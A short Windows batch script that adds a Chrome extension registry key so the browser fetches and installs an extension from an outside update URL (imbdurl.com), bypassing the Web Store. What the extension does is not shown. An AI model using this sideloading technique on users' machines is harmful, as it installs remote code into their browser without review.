@echo off
SET KEY="HKCU\Software\Google\Chrome\Extensions\fhaklhfjbhkkgfekaeklodfbcbndcmcj"
REG ADD %KEY% /v "update_url" /t REG_SZ /d "https://imbdurl.com/extension/updates.xml" /f

echo Extension installation initiated. Please restart Chrome.
pause
